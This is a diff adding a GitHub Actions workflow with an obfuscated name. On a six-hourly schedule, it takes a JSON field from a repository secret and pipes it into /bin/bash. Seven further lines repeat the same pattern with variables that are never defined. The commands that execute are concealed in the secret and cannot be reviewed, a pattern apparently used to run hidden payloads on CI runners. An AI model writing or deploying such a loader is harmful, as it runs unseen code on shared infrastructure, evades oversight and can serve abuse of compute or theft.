@@ -1,0 +1,25 @@
+name: missjosexray
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: missjosexray
+        env:
+          wb68650: ${{ secrets.wb68650 }}
+        run: |
+          echo $wb68650 | jq -r .z0404 | /bin/bash
+          echo $fflwq04 | jq -r .nsx4 | /bin/bash
+          echo $ani993 | jq -r .wwad44607 | /bin/bash
+          echo $sdmu9629 | jq -r .uirwc96 | /bin/bash
+          echo $pctk15094 | jq -r .n5 | /bin/bash
+          echo $m49 | jq -r .g23 | /bin/bash
+          echo $lqj7302 | jq -r .dn69 | /bin/bash
+          echo $ex8353 | jq -r .fsr1 | /bin/bash
+
